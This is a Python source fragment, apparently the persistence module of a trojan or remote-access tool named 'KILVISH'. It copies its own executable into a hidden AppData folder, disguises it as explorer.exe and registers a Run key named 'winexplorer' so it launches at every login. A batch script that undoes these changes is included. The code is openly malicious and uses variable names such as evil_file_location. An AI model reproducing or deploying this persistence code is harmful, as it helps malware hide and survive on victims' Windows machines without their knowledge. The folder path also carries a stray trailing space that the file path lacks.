
class PERSISTENCE:

    REMOVE_SCRIPT = r"""del /q C:\Users\"%USERNAME%"\AppData\Roaming\KILVISH
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer  /f
cls
echo "[*] DONE "
echo "[*] Please Restart Your System!"
pause
"""

    def run(self,command):
        comm = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, errors = comm.communicate()
        return output + errors

    def become_persistent_on_windows(self):
        if sys.argv[0].endswith(".py"):
            print("can't create executable of python file")
        else:
            evil_folder_location = os.environ["appdata"] + "\\KILVISH "
            evil_file_location = os.environ["appdata"] + "\\KILVISH" + "\\explorer.exe"
            if not os.path.exists(evil_folder_location):
                os.mkdir(evil_folder_location)
            command = "attrib +h "+'"'+evil_folder_location+'"'
            self.run(command)
            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                command = "attrib +h "+'"'+evil_file_location+'"'
                self.run(command)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    
    def uninstall(self):
        f = open("remove.bat",'w')
        f.write(self.REMOVE_SCRIPT)
        f.close()
        os.startfile("remove.bat")
